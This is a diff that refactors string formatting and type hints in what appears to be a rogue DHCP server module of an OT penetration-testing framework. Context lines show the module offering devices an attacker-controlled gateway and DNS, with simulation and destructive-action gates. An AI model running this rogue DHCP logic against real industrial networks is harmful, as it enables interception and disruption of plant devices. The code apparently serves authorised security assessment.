@@ -38,7 +38,6 @@ import struct
 import sys
 import threading
 import time
-from typing import Dict, Optional, Tuple
 
 from industrialxpl.core.exploit import (
     Exploit as _Exploit,
@@ -73,7 +72,7 @@ def _parse_ip_range(ip_range: str) -> list:
 
         if "." not in end_part:
             prefix = start_ip.rsplit(".", 1)[0]
-            end_ip = "{}.{}".format(prefix, end_part)
+            end_ip = f"{prefix}.{end_part}"
         else:
             end_ip = end_part
 
@@ -81,10 +80,10 @@ def _parse_ip_range(ip_range: str) -> list:
         end_int = _ip_to_int(end_ip)
         return [_int_to_ip(i) for i in range(start_int, end_int + 1)]
     except Exception as exc:
-        raise ValueError("Invalid IP range '{}': {}".format(ip_range, exc)) from exc
+        raise ValueError(f"Invalid IP range '{ip_range}': {exc}") from exc
 
 
-def _get_iface_mac(iface: str) -> Optional[bytes]:
+def _get_iface_mac(iface: str) -> bytes | None:
     """Get MAC address of interface (Linux only via SIOCGIFHWADDR)."""
     try:
         import fcntl
@@ -167,7 +166,7 @@ def _build_dhcp_options_ack(
     return opts
 
 
-def _parse_dhcp_msg_type(pkt: bytes) -> Optional[int]:
+def _parse_dhcp_msg_type(pkt: bytes) -> int | None:
     """Extract DHCP message type from options field (after BOOTP cookie at offset 236)."""
     if len(pkt) < 240:
         return None
@@ -191,7 +190,7 @@ def _parse_dhcp_msg_type(pkt: bytes) -> Optional[int]:
 
 
 def _mac_bytes_to_str(chaddr: bytes) -> str:
-    return ":".join("{:02x}".format(b) for b in chaddr[:6])
+    return ":".join(f"{b:02x}" for b in chaddr[:6])
 
 
 class Exploit(_Exploit):
@@ -235,14 +234,14 @@ class Exploit(_Exploit):
     simulate = OptBool(False, "Simulate mode: describe without sending packets (default: True)")
     destructive = OptBool(False, "Enable real DHCP spoofing")
 
-    _ip_pool: Dict[str, str] = {}
+    _ip_pool: dict[str, str] = {}
     _pool_lock: threading.Lock = threading.Lock()
 
     def _init_pool(self) -> None:
         ips = _parse_ip_range(self.client_ip_range)
         self._ip_pool = {ip: "" for ip in ips}
 
-    def _allocate_ip(self, mac: str) -> Optional[str]:
+    def _allocate_ip(self, mac: str) -> str | None:
         with self._pool_lock:
             for ip, owner in self._ip_pool.items():
                 if owner == mac:
@@ -267,7 +266,7 @@ class Exploit(_Exploit):
 
         offered_ip = self._allocate_ip(mac_str)
         if not offered_ip:
-            print_warning("[FakeDHCP] IP pool exhausted - cannot offer to {}".format(mac_str))
+            print_warning(f"[FakeDHCP] IP pool exhausted - cannot offer to {mac_str}")
             return
 
         siaddr_b = socket.inet_aton(self.dhcp_server_ip)
@@ -275,43 +274,34 @@ class Exploit(_Exploit):
         yiaddr_b = socket.inet_aton(offered_ip)
 
         if msg_type == 1:
-            print_status("[FakeDHCP] DISCOVER from {} - offering {}".format(mac_str, offered_ip))
+            print_status(f"[FakeDHCP] DISCOVER from {mac_str} - offering {offered_ip}")
             options = _build_dhcp_options_offer(
                 self.dhcp_server_ip, self.client_net_mask, self.client_gateway, self.client_dns
             )
             reply = _build_bootp_reply(2, xid, b"\x00" * 4, yiaddr_b, siaddr_b, giaddr_b, chaddr, options)
-            print_success("[FakeDHCP] OFFER sent to {} IP={} GW={} DNS={}".format(
-                mac_str, offered_ip, self.client_gateway, self.client_dns
-            ))
+            print_success(f"[FakeDHCP] OFFER sent to {mac_str} IP={offered_ip} GW={self.client_gateway} DNS={self.client_dns}")
         else:
-            print_status("[FakeDHCP] REQUEST from {} - ACK {}".format(mac_str, offered_ip))
+            print_status(f"[FakeDHCP] REQUEST from {mac_str} - ACK {offered_ip}")
             options = _build_dhcp_options_ack(
                 self.dhcp_server_ip, self.client_net_mask, self.client_gateway, self.client_dns
             )
             reply = _build_bootp_reply(2, xid, b"\x00" * 4, yiaddr_b, siaddr_b, giaddr_b, chaddr, options)
-            print_success("[FakeDHCP] ACK sent to {} IP={} GW={} DNS={}".format(
-                mac_str, offered_ip, self.client_gateway, self.client_dns
-            ))
+            print_success(f"[FakeDHCP] ACK sent to {mac_str} IP={offered_ip} GW={self.client_gateway} DNS={self.client_dns}")
 
         try:
             sock_send.sendto(reply, ("255.255.255.255", 68))
         except Exception as exc:
-            print_error("[FakeDHCP] Send failed: {}".format(exc))
+            print_error(f"[FakeDHCP] Send failed: {exc}")
 
     def run(self) -> None:
         """Start rogue DHCP server on OT network segment."""
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "Would start rogue DHCP server on interface {iface}, "
-                    "offering IPs from {pool} with gateway={gw} and DNS={dns}. "
+                    f"Would start rogue DHCP server on interface {self.iface}, "
+                    f"offering IPs from {self.client_ip_range} with gateway={self.client_gateway} and DNS={self.client_dns}. "
                     "Any new device on the segment would receive attacker-controlled "
-                    "network configuration.".format(
-                        iface=self.iface,
-                        pool=self.client_ip_range,
-                        gw=self.client_gateway,
-                        dns=self.client_dns,
-                    )
+                    "network configuration."
                 ),
                 mitre_techniques=["T0830", "T0867"],
             )
@@ -326,21 +316,19 @@ class Exploit(_Exploit):
             module_name="assessment/lateral/fake_dhcp_ot",
             target=self.iface,
             impact_level="MEDIUM",
-            description="Rogue DHCP server offering {} IPs with GW={}".format(
-                self.client_ip_range, self.client_gateway
-            ),
+            description=f"Rogue DHCP server offering {self.client_ip_range} IPs with GW={self.client_gateway}",
         ):
             return
 
         try:
             self._init_pool()
         except ValueError as exc:
-            print_error("[FakeDHCP] {}".format(exc))
+            print_error(f"[FakeDHCP] {exc}")
             return
 
         pool_size = len(self._ip_pool)
-        print_status("[FakeDHCP] IP pool ready: {} addresses ({})".format(pool_size, self.client_ip_range))
-        print_status("[FakeDHCP] Listening on {}:67 for DHCP requests...".format(self.iface))
+        print_status(f"[FakeDHCP] IP pool ready: {pool_size} addresses ({self.client_ip_range})")
+        print_status(f"[FakeDHCP] Listening on {self.iface}:67 for DHCP requests...")
         print_info("[FakeDHCP] Press Ctrl+C to stop.")
 
         try:
@@ -357,7 +345,7 @@ class Exploit(_Exploit):
             print_error("[FakeDHCP] Permission denied - run as root.")
             return
         except Exception as exc:
-            print_error("[FakeDHCP] Socket setup failed: {}".format(exc))
+            print_error(f"[FakeDHCP] Socket setup failed: {exc}")
             return
 
         deadline = time.time() + self.listen_timeout if self.listen_timeout > 0 else None
